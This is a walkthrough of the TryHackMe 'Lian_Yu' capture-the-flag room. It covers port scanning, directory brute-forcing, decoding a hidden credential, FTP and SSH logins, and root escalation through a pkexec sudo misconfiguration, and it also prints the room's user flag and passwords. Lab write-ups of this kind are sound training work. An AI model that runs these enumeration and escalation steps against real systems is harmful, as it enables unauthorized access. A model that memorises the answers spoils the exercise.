
Markdown
# Lian_Yu CTF Walkthrough

A comprehensive walkthrough of the **Lian_Yu** room on TryHackMe, focused on web enumeration, decryption, and privilege escalation via `pkexec`.

---

## 1. Reconnaissance & Enumeration

### Network Scanning
I initiated the engagement by scanning the target IP `10.48.186.153` to identify open ports and services.

```bash
nmap 10.48.186.153
Open Ports Identified:

21 (FTP): vsFTPd 3.0.2

22 (SSH): OpenSSH

80 (HTTP): Apache Web Server

111 (rpcbind)

Web Directory Discovery
The web server hosted a page related to the "Arrowverse." I used gobuster to perform directory brute-forcing.

Bash
gobuster dir -u [http://10.48.186.153/island](http://10.48.186.153/island) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
Findings: * /island

/island/2100 (Found via recursive scanning)

Hidden Information
Inspecting the source code of the discovered pages revealed:

The Code Word: A hidden string vigilante was found in the HTML.

The Ticket: A comment in the /2100 directory hinted at a .ticket file.

Navigating to http://10.48.186.153/island/2100/green_arrow.ticket provided a Base58 encoded string: RTy8yhBQdscX.

2. Initial Access & Data Extraction
Decrypting the Token
Using CyberChef, I decoded the Base58 string to reveal the password.

Input: RTy8yhBQdscX

Output: !#th3h00d

FTP Exploitation
Using the username vigilante and the password !#th3h00d, I logged into the FTP server and retrieved a password-protected zip file named ss.zip.

Bash
ftp 10.48.186.153
After extracting ss.zip using the identified passphrase, I obtained two sensitive files:

passwd.txt

shado (Content: M3tahuman)

3. System Access & User Flag
SSH Login
The file shado contained the password for the system user slade.

Bash
ssh slade@10.48.186.153
# Password: M3tahuman
Capturing User Flag
Once authenticated, I located the user flag in the home directory.

Bash
slade@LianYu:~$ cat user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
--Felicity Smoak
4. Privilege Escalation to Root
Sudo Rights Enumeration
I checked the sudo permissions to identify misconfigurations.

Bash
slade@LianYu:~$ sudo -l
Result: The user slade can run /usr/bin/pkexec as root with NOPASSWD.

Exploitation
Using the GTFOBins method for pkexec, I successfully spawned a root shell:

Bash
sudo /usr/bin/pkexec /bin/sh
Final Flag
After gaining root access, I navigated to the root directory to finish the machine.

Bash
# whoami
root
# cat /root/root.txt
